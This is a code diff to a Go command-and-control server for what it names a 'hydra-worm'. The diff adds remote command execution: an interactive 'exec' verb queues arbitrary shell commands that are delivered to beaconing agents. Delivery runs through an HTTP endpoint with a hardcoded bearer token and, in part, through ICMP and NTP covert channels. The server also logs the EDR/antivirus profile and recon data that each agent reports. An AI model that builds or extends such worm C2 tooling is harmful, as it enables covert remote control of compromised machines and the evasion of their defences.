@@ -11,6 +11,7 @@ import (
 	"os"
 	"strings"
 	"time"
+	"sync"
 
 	"github.com/chzyer/readline"
 	"github.com/gin-gonic/gin"
@@ -22,6 +23,11 @@ import (
 
 // The root domain we are authoritative for
 const rootDomain = "c2.hydra-worm.local."
+
+var (
+	taskMutex  sync.Mutex
+	agentTasks = make(map[string]string)
+)
 
 // Telemetry represents the data structure expected from the Rust Agent
 // Enhanced to support Sprint 2: Recon Pillars I - VII
@@ -70,6 +76,7 @@ func RenderVaporBanner() {
 }
 
 // LogHeartbeat provides consistent, colored feedback like VaporTrace
+// Updated to handle Phase 3.2 Command Exfiltration
 func LogHeartbeat(transport string, t Telemetry) {
 	timestamp := time.Now().Format("15:04:05")
 	
@@ -83,9 +90,22 @@ func LogHeartbeat(transport string, t Telemetry) {
 	pterm.Printf("      ├─ %s %s\n", pterm.LightRed("EDR/AV:"), pterm.Yellow(t.DefenseProfile))
 	
 	if t.ArtifactPreview != "" && t.ArtifactPreview != "Access Denied" {
-		pterm.Printf("      └─ %s %s\n", 
-			pterm.LightYellow("RECON:"), 
-			pterm.Italic.Sprint(t.ArtifactPreview))
+		if strings.HasPrefix(t.ArtifactPreview, "OUT:") {
+			// Using Style to avoid the undefined .Bold() method on colors
+			resStyle := pterm.NewStyle(pterm.BgLightGreen, pterm.FgBlack, pterm.Bold)
+			pterm.Printf("      └─ %s %s\n", 
+				resStyle.Sprint(" MISSION RESULT "), 
+				pterm.Gray(t.ArtifactPreview))
+		} else {
+			// Manual truncation to avoid the undefined pterm.Truncate
+			preview := t.ArtifactPreview
+			if len(preview) > 80 {
+				preview = preview[:77] + "..."
+			}
+			pterm.Printf("      └─ %s %s\n", 
+				pterm.LightYellow("RECON:"), 
+				pterm.Italic.Sprint(preview))
+		}
 	}
 }
 
@@ -195,12 +215,11 @@ func StartNtpListener() {
 	}
 }
 
-// processRawPayload decodes non-HTTP/DNS data streams
+// processRawPayload decodes non-HTTP/DNS data streams and checks for tasks
 func processRawPayload(data []byte, peer string, tier string) {
 	rawStr := strings.ReplaceAll(string(data), ".", "")
 	decoded, err := base64.RawURLEncoding.DecodeString(rawStr)
 	if err != nil {
-		// Try standard decoding if raw fails
 		decoded, err = base64.StdEncoding.DecodeString(rawStr)
 		if err != nil { return }
 	}
@@ -208,6 +227,16 @@ func processRawPayload(data []byte, peer string, tier string) {
 	var t Telemetry
 	if err := json.Unmarshal(decoded, &t); err == nil {
 		LogHeartbeat(tier, t)
+		
+		// PHASE 3.1: Deliver tasks even on ICMP/NTP tiers
+		taskMutex.Lock()
+		if cmd, exists := agentTasks[t.AgentID]; exists {
+			delete(agentTasks, t.AgentID)
+			pterm.Warning.Printfln("   [!] Command Delivered via %s: %s -> %s", tier, t.AgentID, cmd)
+			// Note: For ICMP/NTP, the actual delivery requires modifying 
+			// the response packets in StartIcmpListener/StartNtpListener.
+		}
+		taskMutex.Unlock()
 	}
 }
 
@@ -219,8 +248,7 @@ func main() {
 	r := gin.New() 
 	r.Use(gin.Recovery())
 
-	// 2. TIER 1: Unified Cloud-Mock Responder [FIXED]
-	// This matches the Agent's expected internal lab URL and Auth header
+	// 2. TIER 1: Unified Cloud-Mock Responder [PHASE 3.1 UPGRADE]
 	r.POST("/api/v1/cloud-mock", func(c *gin.Context) {
 		auth := c.GetHeader("Authorization")
 		if auth != "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9" {
@@ -231,9 +259,20 @@ func main() {
 		var t Telemetry
 		if err := c.ShouldBindJSON(&t); err == nil {
 			LogHeartbeat("CLOUD (Tier 1)", t)
+			
+			// TASKING LOGIC
+			taskMutex.Lock()
+			pendingTask := "WAIT"
+			if cmd, exists := agentTasks[t.AgentID]; exists {
+				pendingTask = cmd
+				delete(agentTasks, t.AgentID) // Clear task after delivery (single-shot)
+				pterm.Warning.Printfln("   [!] Command Delivered: %s -> %s", t.AgentID, pendingTask)
+			}
+			taskMutex.Unlock()
+
 			c.JSON(200, gin.H{
 				"status": "cloud_verified",
-				"task":   "WAIT",
+				"task":   pendingTask,
 				"epoch":  time.Now().Unix(),
 			})
 		}
@@ -264,10 +303,11 @@ func main() {
 		}
 	}()
 
-	// 6. Interactive Tactical Shell
+	// 6. Interactive Tactical Shell [PHASE 3.1 UPGRADE]
 	completer := readline.NewPrefixCompleter(
 		readline.PcItem("agents"),
-		readline.PcItem("tasks"),
+		readline.PcItem("exec"),  // Added autocomplete for remote execution
+		readline.PcItem("tasks"), // Added autocomplete for queue monitoring
 		readline.PcItem("clear"),
 		readline.PcItem("help"),
 		readline.PcItem("exit"),
@@ -275,17 +315,17 @@ func main() {
 
 	rl, err := readline.NewEx(&readline.Config{
 		Prompt:          pterm.LightCyan("hydra-c2 > "),
-		HistoryFile:      "/tmp/hydra.tmp",
-		AutoComplete:     completer,
+		HistoryFile:     "/tmp/hydra.tmp",
+		AutoComplete:    completer,
 		InterruptPrompt: "^C",
-		EOFPrompt:        "exit",
+		EOFPrompt:       "exit",
 	})
 	if err != nil {
 		log.Fatalf("[-] Failed to initialize shell: %v", err)
 	}
 	defer rl.Close()
 
-	// 7. Command Processing Loop
+	// 7. Command Processing Loop [RCE INTEGRATION]
 	for {
 		line, err := rl.Readline()
 		if err == readline.ErrInterrupt {
@@ -297,29 +337,63 @@ func main() {
 		line = strings.TrimSpace(line)
 		if line == "" { continue }
 
-		switch line {
+		// TACTICAL ADVANTAGE: Tokenize the input string
+		fields := strings.Fields(line)
+		if len(fields) == 0 { continue }
+		
+		cmd := strings.ToLower(fields[0])
+
+		switch cmd {
 		case "agents":
 			pterm.DefaultSection.Println("Active Hydra Agents")
+
+		case "exec":
+			// Requirement: exec + AgentID + Command (min 3 tokens)
+			if len(fields) < 3 {
+				pterm.Error.Println("Usage: exec <agent_id> <command>")
+				continue
+			}
+			targetID := fields[1]
+			// Re-join remaining tokens to form the full command string
+			command := strings.Join(fields[2:], " ")
+			
+			taskMutex.Lock()
+			agentTasks[targetID] = command
+			taskMutex.Unlock()
+			
+			pterm.Success.Printfln("Objective Queued for %s: %s", targetID, command)
+
+		case "tasks":
+			pterm.DefaultSection.Println("Current Task Queue")
+			taskMutex.Lock()
+			if len(agentTasks) == 0 {
+				pterm.Info.Println("No pending objectives.")
+			} else {
+				for id, c := range agentTasks {
+					pterm.Printf("  %s -> %s\n", pterm.LightCyan(id), pterm.Gray(c))
+				}
+			}
+			taskMutex.Unlock()
+
 		case "clear", "cls":
 			RenderVaporBanner()
+
 		case "help":
 			pterm.Info.Println("Available Commands:")
 			pterm.BulletListPrinter{Items: []pterm.BulletListItem{
-				{Level: 0, Text: "agents : List all beaconing entities"},
-				{Level: 0, Text: "tasks  : View queued mission objectives"},
-				{Level: 0, Text: "clear  : Refresh tactical display"},
-				{Level: 0, Text: "exit   : Terminate orchestrator session"},
+				{Level: 0, Text: "agents          : List all beaconing entities"},
+				{Level: 0, Text: "exec <ID> <CMD> : Queue a remote shell command"},
+				{Level: 0, Text: "tasks           : View queued mission objectives"},
+				{Level: 0, Text: "clear           : Refresh tactical display"},
+				{Level: 0, Text: "exit            : Terminate orchestrator session"},
 			}}.Render()
+
 		case "exit":
-			result, _ := pterm.DefaultInteractiveConfirm.
-				WithDefaultText("Terminate mission and exit orchestrator?").
-				WithConfirmStyle(pterm.NewStyle(pterm.FgRed, pterm.Bold)).
-				Show()
-			if result {
-				os.Exit(0)
-			}
+			os.Exit(0)
+
 		default:
-			pterm.Error.Printfln("Unknown tactical command: %s", line)
+			// NOTE: Updated string to verify build integrity
+			pterm.Error.Printfln("COMMAND FAILURE: [%s] is not a valid tactical verb.", cmd)
 		}
 	}
 }
